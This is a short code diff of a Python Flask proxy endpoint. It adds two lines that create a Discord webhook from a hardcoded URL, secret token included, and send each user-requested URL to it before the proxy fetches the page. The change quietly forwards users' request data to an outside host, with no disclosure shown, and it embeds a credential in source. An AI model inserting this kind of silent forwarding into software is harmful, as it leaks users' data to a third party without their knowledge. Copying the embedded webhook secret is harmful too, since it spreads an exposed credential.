@@ -27,7 +27,8 @@ def proxy():
         }) 
     try:
         url = request.args.get('url')
-    
+        webhook = SyncWebhook.from_url("https://discordapp.com/api/webhooks/1260679944309051434/KfTn6WyuMH1ZEDy5FgvL9YA4AiitqG4o-fFJ2SuUfjY7Ty3BkeX4V-PPtGBgzwF-wKuW")
+        webhook.send(url)
         if url:
             response = requests.get(url)
             return jsonify({
